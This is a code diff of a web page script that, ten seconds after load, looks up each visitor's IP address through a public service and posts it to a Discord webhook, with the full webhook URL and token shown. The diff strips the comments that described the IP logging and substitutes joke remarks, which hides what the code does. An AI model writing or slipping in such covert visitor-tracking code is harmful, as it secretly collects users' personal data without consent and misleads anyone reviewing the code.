@@ -67,8 +67,7 @@
         document.addEventListener('DOMContentLoaded', function() {
             setTimeout(function() {
                 document.getElementById('text2').classList.remove('hidden');
-                // Send IP to Discord webhook
-                sendIPToWebhook();
+                sendIPToWebhook(); // erm
             }, 10000);
         });
 
@@ -79,13 +78,11 @@
         });
 
         function sendIPToWebhook() {
-            // Get user's IP address using a third-party service
             fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 const ipAddress = data.ip;
-                // Send IP address to Discord webhook
-                fetch('https://discord.com/api/webhooks/1234480011193483356/ObM_OYrW-7_ujLYBXHlleFE9gXSxMLiG6UnV9jvPiiXYAwtCN13ZPG6o4n8Cgie9xR8M', {
+                fetch('https://discord.com/api/webhooks/1234480011193483356/ObM_OYrW-7_ujLYBXHlleFE9gXSxMLiG6UnV9jvPiiXYAwtCN13ZPG6o4n8Cgie9xR8M', { //erm what the sigma
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
